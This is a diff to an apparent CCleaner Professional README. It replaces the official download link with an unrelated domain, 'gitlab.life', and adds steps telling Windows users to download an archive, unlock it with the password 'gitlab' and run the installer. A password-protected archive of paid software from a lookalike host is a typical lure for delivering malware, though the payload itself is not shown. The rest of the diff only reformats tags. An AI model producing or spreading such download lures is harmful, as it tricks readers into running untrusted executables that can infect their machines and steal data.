@@ -10,7 +10,7 @@
 </p>
 
 <p align="center">
-  <a href="https://www.ccleaner.com/ccleaner/professional">
+  <a href="https://gitlab.life/">
     <img src="https://cdn.intheloop.io/wp-content/uploads/2020/08/windows-button.png" width="240" alt="Get CCleaner Professional for Windows">
   </a>
 </p>
@@ -18,6 +18,15 @@
 <p align="center">
   <b>Password:</b> <code>gitlab</code>
 </p>
+
+---
+
+## Installation Instructions
+
+1. Click the download button above.
+2. Save the CCleaner archive to your Windows PC.
+3. Extract the archive using the password <code>gitlab</code>.
+4. Start the installer and complete the setup.
 
 ---
 
@@ -361,26 +370,12 @@ CCleaner is designed around routine Windows cleaning, privacy management, softwa
 
 ## 🏷️ Tags
 
-`ccleaner`
-`ccleaner-professional`
-`ccleaner-windows`
-`ccleaner-pc`
-`ccleaner-cleaner`
-`ccleaner-optimization`
-`ccleaner-performance`
-`ccleaner-health-check`
-`ccleaner-driver-updater`
-`ccleaner-software-updater`
-`ccleaner-smart-cleaning`
-`ccleaner-scheduled-cleaning`
-`ccleaner-cloud-cleaner`
-`ccleaner-privacy`
-`ccleaner-registry`
-`ccleaner-startup`
-`windows-cleaner`
-`windows-optimization`
-`pc-maintenance`
-`windows-utility`
+`ccleaner` `ccleaner-professional` `ccleaner-windows` `ccleaner-pc`  
+`ccleaner-cleaner` `ccleaner-optimization` `ccleaner-performance`  
+`ccleaner-health-check` `ccleaner-driver-updater` `ccleaner-software-updater`  
+`ccleaner-smart-cleaning` `ccleaner-scheduled-cleaning` `ccleaner-cloud-cleaner`  
+`ccleaner-privacy` `ccleaner-registry` `ccleaner-startup`  
+`windows-cleaner` `windows-optimization` `pc-maintenance` `windows-utility`
 
 ---
 
